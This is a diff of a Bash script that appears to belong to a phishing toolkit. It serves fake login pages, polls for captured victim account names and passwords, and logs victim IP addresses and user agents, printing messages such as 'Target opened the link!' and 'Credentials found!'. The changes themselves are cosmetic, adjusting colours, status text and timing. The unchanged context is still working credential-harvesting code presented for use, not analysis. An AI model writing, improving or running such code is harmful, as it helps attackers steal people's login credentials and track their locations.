@@ -215,15 +215,13 @@ printf '</html>\n' >> sites/create/login.html
 }
 
 catch_cred() {
-
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 }
 
@@ -233,10 +231,11 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
+printf "\e[1;92m[\e[0m\e[0m+\e[0m\e[1;92m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;92m[\e[0m\e[0m+\e[0m\e[1;92m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+
 
 if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
@@ -306,9 +305,8 @@ if [[ $ip_currency != "" ]]; then
 printf "\e[1;92m[\e[0m*\e[1;92m] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
 fi
 ##
-printf "\n"
 rm -rf iptracker.log
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for credentials...\e[0m\n"
 
 }
 
@@ -434,21 +432,22 @@ fi
 
 }
 checkfound() {
-
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-sleep 1
+sleep 0.5
+printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for IP...\e[0m\n"
+sleep 0.6
 printf "\e[1;92m[\e[0m+\e[1;92m] IP found!\n"
 catch_ip
 rm -rf sites/$server/ip.txt
 fi
 sleep 0.5
 if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\e[1;93m[\e[0m+\e[1;93m]\e[0m\e[1;92m Credentials found!\n"
+printf "\e[1;92m[\e[0m+\e[0m\e[1;92m] Credentials found!\n"
 catch_cred
 rm -rf sites/$server/usernames.txt
 fi
